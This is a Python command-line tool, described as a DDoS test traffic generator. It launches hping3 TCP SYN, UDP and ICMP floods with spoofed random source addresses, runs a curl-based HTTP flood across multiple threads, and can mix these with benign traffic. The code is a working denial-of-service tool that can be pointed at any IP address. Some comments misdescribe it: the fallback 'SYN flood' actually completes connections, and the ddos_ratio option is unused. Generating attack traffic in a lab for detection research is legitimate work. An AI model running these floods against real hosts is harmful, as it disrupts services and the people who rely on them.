"""
Traffic Generator for DDoS Testing
Generates both benign and DDoS traffic patterns using hping3 for realistic attack traffic
"""

import argparse
import random
import time
import threading
import subprocess
import sys
import os
from typing import List, Optional


class TrafficGenerator:
    """Generate various traffic patterns for testing using hping3"""

    def __init__(self, target_ip: str, target_port: int = 80):
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = False
        self.threads: List[threading.Thread] = []
        self.processes: List[subprocess.Popen] = []

        # Check if hping3 is available
        self.hping3_available = self._check_hping3()

    def _check_hping3(self) -> bool:
        """Check if hping3 is available"""
        try:
            subprocess.run(['which', 'hping3'], capture_output=True, check=True)
            return True
        except (subprocess.CalledProcessError, FileNotFoundError):
            print("WARNING: hping3 not found. Install with: apt-get install hping3")
            print("Falling back to Python socket implementation (less realistic)")
            return False

    def _tcp_flood_hping3(self, duration: int, pps: int, source_port: Optional[int] = None):
        """TCP SYN flood using hping3 with rate control via -i (interval)"""
        end_time = time.time() + duration

        # Calculate interval in microseconds for desired pps
        # hping3 -i uX sets interval to X microseconds
        # pps = 1,000,000 / interval_us
        if pps > 0:
            interval_us = max(1, int(1_000_000 / pps))
            rate_arg = ['-i', f'u{interval_us}']
        else:
            rate_arg = ['--flood']  # Maximum rate if pps=0

        # Build hping3 command for SYN flood
        # -S: SYN flag, -p: target port
        cmd = ['hping3', '-S'] + rate_arg + ['-p', str(self.target_port)]

        if source_port:
            cmd.extend(['--baseport', str(source_port)])
        else:
            cmd.append('--rand-source')

        cmd.append(self.target_ip)

        print(f"Starting hping3 SYN flood: {' '.join(cmd)} (target ~{pps} pps)")

        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.processes.append(proc)

            # Wait for duration
            while time.time() < end_time and self.running:
                time.sleep(0.1)

            # Terminate hping3
            proc.terminate()
            try:
                proc.wait(timeout=2)
            except subprocess.TimeoutExpired:
                proc.kill()

        except Exception as e:
            print(f"hping3 error: {e}")

    def _udp_flood_hping3(self, duration: int, pps: int, payload_size: int = 64):
        """UDP flood using hping3 with rate control via -i (interval)"""
        end_time = time.time() + duration

        # Calculate interval in microseconds for desired pps
        if pps > 0:
            interval_us = max(1, int(1_000_000 / pps))
            rate_arg = ['-i', f'u{interval_us}']
        else:
            rate_arg = ['--flood']

        # Build hping3 command for UDP flood
        # --udp: UDP mode, -d: data size, -p: target port
        cmd = ['hping3', '--udp'] + rate_arg + ['-p', str(self.target_port), '-d', str(payload_size)]
        cmd.append('--rand-source')
        cmd.append(self.target_ip)

        print(f"Starting hping3 UDP flood: {' '.join(cmd)} (target ~{pps} pps)")

        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.processes.append(proc)

            # Wait for duration
            while time.time() < end_time and self.running:
                time.sleep(0.1)

            # Terminate hping3
            proc.terminate()
            try:
                proc.wait(timeout=2)
            except subprocess.TimeoutExpired:
                proc.kill()

        except Exception as e:
            print(f"hping3 error: {e}")

    def _icmp_flood_hping3(self, duration: int, pps: int):
        """ICMP flood using hping3 with rate control via -i (interval)"""
        end_time = time.time() + duration

        # Calculate interval in microseconds for desired pps
        if pps > 0:
            interval_us = max(1, int(1_000_000 / pps))
            rate_arg = ['-i', f'u{interval_us}']
        else:
            rate_arg = ['--flood']

        # Build hping3 command for ICMP flood
        # --icmp: ICMP mode
        cmd = ['hping3', '--icmp'] + rate_arg
        cmd.append('--rand-source')
        cmd.append(self.target_ip)

        print(f"Starting hping3 ICMP flood: {' '.join(cmd)}")

        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.processes.append(proc)

            while time.time() < end_time and self.running:
                time.sleep(0.1)

            proc.terminate()
            try:
                proc.wait(timeout=2)
            except subprocess.TimeoutExpired:
                proc.kill()

        except Exception as e:
            print(f"hping3 error: {e}")

    def _tcp_flood_fallback(self, duration: int, pps: int, source_port: Optional[int] = None):
        """Fallback TCP SYN flood using Python sockets (if hping3 not available)"""
        import socket
        end_time = time.time() + duration
        interval = 1.0 / pps if pps > 0 else 0

        while time.time() < end_time and self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                if source_port:
                    sock.bind(('', source_port))
                sock.connect((self.target_ip, self.target_port))
                # Send SYN only (no ACK) - this is a SYN flood
                sock.send(b'GET / HTTP/1.1\r\nHost: test\r\n\r\n')
                sock.close()
            except:
                pass

            if interval > 0:
                time.sleep(interval)

    def _udp_flood_fallback(self, duration: int, pps: int, payload_size: int = 64):
        """Fallback UDP flood using Python sockets"""
        import socket
        end_time = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = b'X' * payload_size
        interval = 1.0 / pps if pps > 0 else 0

        while time.time() < end_time and self.running:
            try:
                sock.sendto(payload, (self.target_ip, self.target_port))
            except:
                pass

            if interval > 0:
                time.sleep(interval)

    def _icmp_flood_fallback(self, duration: int, pps: int):
        """Fallback ICMP flood using ping (cross-platform)"""
        import platform
        end_time = time.time() + duration
        interval = 1.0 / pps if pps > 0 else 0

        # Windows uses -n for count, -w for timeout (ms)
        # Linux uses -c for count, -W for timeout (seconds)
        if platform.system().lower() == 'windows':
            ping_cmd = ['ping', '-n', '1', '-w', '1000', self.target_ip]
        else:
            ping_cmd = ['ping', '-c', '1', '-W', '1', self.target_ip]

        while time.time() < end_time and self.running:
            try:
                subprocess.run(ping_cmd, capture_output=True, timeout=2)
            except:
                pass

            if interval > 0:
                time.sleep(interval)

    def _http_flood(self, duration: int, rps: int):
        """HTTP request flood using curl"""
        end_time = time.time() + duration
        interval = 1.0 / rps if rps > 0 else 0

        while time.time() < end_time and self.running:
            try:
                subprocess.run(['curl', '-s', '-o', '/dev/null', '-w', '%{http_code}',
                               f'http://{self.target_ip}:{self.target_port}/'],
                              capture_output=True, timeout=2)
            except:
                pass

            if interval > 0:
                time.sleep(interval)

    def _benign_traffic(self, duration: int, rps: int):
        """Generate benign traffic patterns"""
        end_time = time.time() + duration
        interval = 1.0 / rps if rps > 0 else 0

        # Mix of HTTP, DNS, SSH-like traffic
        ports = [80, 443, 53, 22, 5000, 8080]

        while time.time() < end_time and self.running:
            port = random.choice(ports)
            try:
                if port in [80, 443, 5000, 8080]:
                    subprocess.run(['curl', '-s', '-o', '/dev/null',
                                   f'http://{self.target_ip}:{port}/'],
                                  capture_output=True, timeout=2)
                elif port == 53:
                    subprocess.run(['dig', f'@{self.target_ip}', 'example.com'],
                                  capture_output=True, timeout=2)
                elif port == 22:
                    subprocess.run(['nc', '-z', '-w', '1', self.target_ip, '22'],
                                  capture_output=True, timeout=2)
            except:
                pass

            if interval > 0:
                time.sleep(interval)

    def start_ddos(self, attack_type: str, duration: int, intensity: int,
                   num_sources: int = 1):
        """Start DDoS attack using hping3"""
        self.running = True

        attack_funcs_hping3 = {
            'tcp': self._tcp_flood_hping3,
            'udp': self._udp_flood_hping3,
            'icmp': self._icmp_flood_hping3,
            'http': self._http_flood,
        }

        attack_funcs_fallback = {
            'tcp': self._tcp_flood_fallback,
            'udp': self._udp_flood_fallback,
            'icmp': self._icmp_flood_fallback,
            'http': self._http_flood,
        }

        if attack_type not in attack_funcs_hping3:
            raise ValueError(f"Unknown attack type: {attack_type}")

        func = attack_funcs_hping3[attack_type] if self.hping3_available else attack_funcs_fallback[attack_type]
        pps = intensity  # packets per second per source

        print(f"Starting {attack_type.upper()} flood: {duration}s, {pps} pps, {num_sources} sources")
        if not self.hping3_available:
            print("WARNING: Using fallback implementation (less realistic)")

        for i in range(num_sources):
            source_port = 10000 + i if num_sources > 1 else None
            t = threading.Thread(target=func, args=(duration, pps, source_port))
            t.daemon = True
            t.start()
            self.threads.append(t)

        # Wait for completion with timeout to avoid hanging
        for t in self.threads:
            t.join(timeout=duration + 5)  # Allow extra time for cleanup
            if t.is_alive():
                print(f"Warning: Thread {t.name} did not finish in time")

        self.running = False
        self._cleanup_processes()
        print("Attack completed")

    def start_benign(self, duration: int, rps: int = 10):
        """Start benign traffic"""
        self.running = True
        print(f"Starting benign traffic: {duration}s, {rps} rps")

        t = threading.Thread(target=self._benign_traffic, args=(duration, rps))
        t.daemon = True
        t.start()
        self.threads.append(t)

        for t in self.threads:
            t.join(timeout=duration + 5)
            if t.is_alive():
                print(f"Warning: Thread {t.name} did not finish in time")

        self.running = False
        print("Benign traffic completed")

    def start_mixed(self, duration: int, ddos_ratio: float = 0.3,
                    ddos_type: str = 'tcp', ddos_intensity: int = 100,
                    benign_rps: int = 20):
        """Start mixed benign + DDoS traffic"""
        self.running = True
        print(f"Starting mixed traffic: {duration}s, DDoS ratio: {ddos_ratio}")

        # Start benign traffic
        benign_duration = duration
        benign_thread = threading.Thread(target=self._benign_traffic,
                                        args=(benign_duration, benign_rps))
        benign_thread.daemon = True
        benign_thread.start()
        self.threads.append(benign_thread)

        # Start DDoS after short delay
        time.sleep(2)
        if self.running:
            ddos_duration = duration - 2
            attack_funcs_hping3 = {
                'tcp': self._tcp_flood_hping3,
                'udp': self._udp_flood_hping3,
                'icmp': self._icmp_flood_hping3,
                'http': self._http_flood,
            }
            attack_funcs_fallback = {
                'tcp': self._tcp_flood_fallback,
                'udp': self._udp_flood_fallback,
                'icmp': self._icmp_flood_fallback,
                'http': self._http_flood,
            }
            func = attack_funcs_hping3.get(ddos_type, self._tcp_flood_hping3) if self.hping3_available \
                   else attack_funcs_fallback.get(ddos_type, self._tcp_flood_fallback)
            ddos_thread = threading.Thread(target=func,
                                          args=(ddos_duration, ddos_intensity))
            ddos_thread.daemon = True
            ddos_thread.start()
            self.threads.append(ddos_thread)

        for t in self.threads:
            t.join(timeout=duration + 5)
            if t.is_alive():
                print(f"Warning: Thread {t.name} did not finish in time")

        self.running = False
        self._cleanup_processes()
        print("Mixed traffic completed")

    def _cleanup_processes(self):
        """Clean up any remaining hping3 processes"""
        for proc in self.processes:
            try:
                if proc.poll() is None:
                    proc.terminate()
                    proc.wait(timeout=1)
            except:
                try:
                    proc.kill()
                except:
                    pass
        self.processes.clear()

    def stop(self):
        """Stop all traffic"""
        self.running = False
        self._cleanup_processes()
        for t in self.threads:
            t.join(timeout=2)
        self.threads.clear()


def iperf3_test(target_ip: str, duration: int = 30, parallel: int = 10,
                reverse: bool = False, udp: bool = False, bandwidth: str = '100M'):
    """Run iperf3 benchmark"""
    cmd = ['iperf3', '-c', target_ip, '-t', str(duration), '-P', str(parallel)]

    if reverse:
        cmd.append('-R')
    if udp:
        cmd.extend(['-u', '-b', bandwidth])

    print(f"Running: {' '.join(cmd)}")
    result = subprocess.run(cmd, capture_output=True, text=True)
    print(result.stdout)
    if result.stderr:
        print(result.stderr, file=sys.stderr)
    return result.returncode == 0


def main():
    parser = argparse.ArgumentParser(description='DDoS Traffic Generator (uses hping3 for realistic attacks)')
    parser.add_argument('--target', required=True, help='Target IP address')
    parser.add_argument('--port', type=int, default=80, help='Target port')
    parser.add_argument('--duration', type=int, default=60, help='Duration in seconds')

    subparsers = parser.add_subparsers(dest='mode', required=True)

    # DDoS attack
    ddos_parser = subparsers.add_parser('ddos', help='DDoS attack')
    ddos_parser.add_argument('--type', choices=['tcp', 'udp', 'icmp', 'http'],
                           default='tcp', help='Attack type')
    ddos_parser.add_argument('--intensity', type=int, default=1000,
                           help='Packets per second per source')
    ddos_parser.add_argument('--sources', type=int, default=1,
                           help='Number of source threads')

    # Benign traffic
    benign_parser = subparsers.add_parser('benign', help='Benign traffic')
    benign_parser.add_argument('--rps', type=int, default=10,
                             help='Requests per second')

    # Mixed traffic
    mixed_parser = subparsers.add_parser('mixed', help='Mixed benign + DDoS')
    mixed_parser.add_argument('--ddos-ratio', type=float, default=0.3,
                            help='Ratio of DDoS traffic')
    mixed_parser.add_argument('--ddos-type', choices=['tcp', 'udp', 'icmp', 'http'],
                            default='tcp', help='DDoS attack type')
    mixed_parser.add_argument('--ddos-intensity', type=int, default=100,
                            help='DDoS packets per second')
    mixed_parser.add_argument('--benign-rps', type=int, default=20,
                            help='Benign requests per second')

    # iperf3
    iperf_parser = subparsers.add_parser('iperf', help='iperf3 benchmark')
    iperf_parser.add_argument('--parallel', type=int, default=10)
    iperf_parser.add_argument('--reverse', action='store_true')
    iperf_parser.add_argument('--udp', action='store_true')
    iperf_parser.add_argument('--bandwidth', default='100M')

    args = parser.parse_args()

    gen = TrafficGenerator(args.target, args.port)

    try:
        if args.mode == 'ddos':
            gen.start_ddos(args.type, args.duration, args.intensity, args.sources)
        elif args.mode == 'benign':
            gen.start_benign(args.duration, args.rps)
        elif args.mode == 'mixed':
            gen.start_mixed(args.duration, args.ddos_ratio, args.ddos_type,
                          args.ddos_intensity, args.benign_rps)
        elif args.mode == 'iperf':
            iperf3_test(args.target, args.duration, args.parallel,
                       args.reverse, args.udp, args.bandwidth)
    except KeyboardInterrupt:
        print("\nStopping...")
        gen.stop()


if __name__ == '__main__':
    main()